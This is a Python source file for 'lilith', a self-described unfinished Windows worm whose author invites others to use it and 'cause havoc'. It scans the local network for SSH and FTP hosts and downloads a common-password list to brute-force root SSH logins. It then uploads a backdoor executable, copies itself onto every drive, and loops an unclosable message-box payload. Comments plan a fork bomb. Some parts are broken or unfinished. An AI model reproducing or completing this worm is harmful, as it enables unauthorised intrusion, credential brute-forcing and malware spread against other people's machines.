# lilith - created by Virgo_Foxxi
# ----------
# this is a basic WIP worm and still needs work, but it still has many basic features.
# the code is still missing many diffewrent things.
# it has been designec to debug in an eawsy to follow way.
# if chu wish to uswe / edit this then pleawse credit me?
# ----------

# usawge
# ----------
# to ruwn this you will need to make this file a .exe
# &^ as such thiws only works on windows based systems (sad face).
# ^ and then let it cauwse hawvoc!!!! “ψ(｀∇´)ψ 
# ----------

# extra module downloads
# ----------
import sys
import subprocess

subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
'python-nmap', 'paramiko', 'pywin32', 'python-git', 'netifaces', 'networking'])
# ----------

# imports
# ----------
import nmap
import paramiko
import os
import socket
from urllib.request import urlopen
import urllib
import time
from ftplib import FTP
import ftplib
from shutil import copy2
import win32api
import netifaces
import threading
from threading import Thread
# ----------
import networking
# ----------

# logging
# ----------
import coloredlogs, logging
logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)
# ----------

# network gateway
# ----------
gws = netifaces.gateway()
gateway = gws['default'][netifaces.AF_INET][0]
# ----------

# SSH scanning - port 22
# ----------
def scan_ssh_hosts():
    logger.debug("lilith: scanning for SSH:22 machines (｀・ω・´) ")
    logger.debug("lilith: gateway is: " + gateway)

    port_scanner = nmap.PortScanner()
    port_scanner.scan(gateway + "/24", arguments='-p 22 --open')
    all_hosts = port_scanner.all_hosts()

    logger.debug("lilith: The uninfected are: " + str(all_hosts))
    return all_hosts
# ----------

# FTP scanning - port 21
# ----------
def scan_ftp_hosts():
    logger.debug("lilith: scanning for FTP:21 machines (｀・ω・´) ")

    port_scanner = nmap.PortScanner()
    port_scanner.scan(gateway + '/24', arguments='-p 21 --open')
    all_hosts = port_scanner.all_hosts()

    logger.debug("lilith: The uninfected are: " + str(all_hosts))
    return all_hosts
# ----------

# SSH password-list download
# ----------
def download_ssh_passwords(filename):
    logger.debug("lilith: trying to download password list....")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
# wordlist used is the top 1000 passwords worldwide! so will chatch most basic passwords.
    urllib.request.urlretrieve(url, filename)
    logger.debug("lilith: passwords for SSH succesfully downloaded (´ω｀★) ")
# ----------

# FTP connection
# ----------
def connect_to_ftp(host, username, password):
    try:
        ftp = FTP(host)
        ftp.login(username, password)
    except ftplib.all_errors as error:
        logger.error(error)
        logger.debug("lilith: error connection to FTP (×_×;)")
        pass
# note: need to finish this part + create brute forcing (probally will not though)
# ----------

# backdoor program
# ----------
def backdoor():
    import pygit
# needs to be finnished but will auto download/install a backdoor tool
# ----------

# SSH connection
# ----------
def connect_to_ssh(host, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        logger.debug("lilith: connecting to: " + host + " via SSH (｀・ω・´) ")
        client.connect(host, 22, "root", password)
        logger.debug("lilith: succesfully connected via SSH (´ω｀★)")

        sftp = client.open_sftp()
        sftp.put('backdoor.exe', "destination")
        # remeber to change this before use ^

        return True
    except socket.error:
        logger.error("lilith: system is offline or port 22 is locked (∪。∪)。。。zzz ")

        return False
    except paramiko.ssh_exception.AuthenticationException:
        logger.error("lilith: incorrect password or username (×_×;)")

        return False
    except paramiko.ssh_exception.SSHException:
        logger.error("lilith: No response from SSH server (∪。∪)。。。zzz")
        return False
# ----------

# SSH bruteforcing
# ----------
def bruteforcing_ssh(host, wordlist):
    file = open(wordlist, "r")
    for line in file:
        connection = connect_to_ssh(host, line)
        print(connection)
        time.sleep(5)
# ----------

# infection (drive spreading) process!
# ----------
def drive_spreading():
    while True:
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        print(drives)
        logger.debug("lilith: drives found: " + drives)
        logger.debug("lilith: begining infection of drives（ΦωΦ)")
        for drive in drives:
            try:
                if "C:\\" == drive:
                    copy2(__file__, bootfolder)
                else:
                    copy2(__file__, drive)
            except:
                pass

        time.sleep(3)
# ----------

# infection (drive spreading) start!!
# ----------
def start_drive_spreading():
    thread = Thread(target = drive_spreading)
    thread.start()
# ----------

# executable code - payload
# ----------
def executable_code():
    logger.debug("lilith: executing payload (´ω｀★)")
    import tkinter
    import tkinter.messagebox
    
    while True:
        root=Tk()
        tkinter.messagebox.showinfo('lilith: wellp... ',"""
|\_/|,,_____,~~`
(.+.)~~     )`~}{\}
 \o/\ /---~\\ ~{\}
   _//    _// ~}
""")
        root.mainloop()
# ----------
# note the box will reopen when closed, need to make it opens tons at once!
# ----------
# note - note on smaller screens the art appears warped.
# need to add a countdown timer for a fork bomb. “ψ(｀∇´)ψ 
# ^ or i need to make multiple files / boxes open at once.
# ----------

# main string - this connecwts everwything
# WARNING - these will all run arouwnd the same thime!
# ----------
def main():
# main - lilith starting scanning
    timer = threading.Timer(5.0, scan_ftp_hosts(), scan_ftp_hosts())
    timer.start()
    logger.debug("lilith: begun countdown timer to scanning (∪。∪)。。。zzz ")
# ----------

# main - lilith started FTP / SSH connection
# ----------
    connect_to_ftp(host, username, password)
    download_ssh_passwords(filename)
    connect_to_ssh(host, password)
    bruteforcing_ssh(host, wordlist)
# ----------

# main - lilith started infection
# ----------
    timer = threading.Timer(5.0, start_drive_spreading(), executable_code())
    logger.debug("lilith: begun countdown timer to infection (´ω｀★)")
    timer.start()
    executable_code()
# ----------
logger.debug("lilith: Finnished cauwsing Havowc on this machine! “ψ(｀∇´)ψ ")
# ----------

# extra - main start
# ----------
if __name__ == "__main__":
    main()
# ----------
